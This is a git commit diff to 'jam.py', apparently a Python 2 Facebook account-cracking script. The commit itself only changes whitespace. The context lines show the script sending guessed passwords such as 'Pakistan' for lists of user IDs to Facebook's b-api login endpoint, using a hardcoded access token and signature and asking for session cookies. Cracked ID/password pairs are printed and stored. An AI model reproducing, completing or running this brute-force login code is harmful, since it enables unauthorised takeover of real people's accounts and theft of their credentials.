dd7e61d9c552307c37cee926b25eec8ecda6f50b
Jam302 <65140038+Jam302@users.noreply.github.com>
2020-05-22 00:55:39 +0500

    Update jam.py

--- jam.py
+++ jam.py
@@ -426,7 +426,7 @@ def pilih_super():
 				                                                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user									
 				                                                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass10 + '\n'											
 				                                                                        oks.append(user+pass10)  				
-						                                               else:								
+						                                                else:								
 							                                                pass11 = 'Pakistan'											
 			                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                q = json.load(data)												
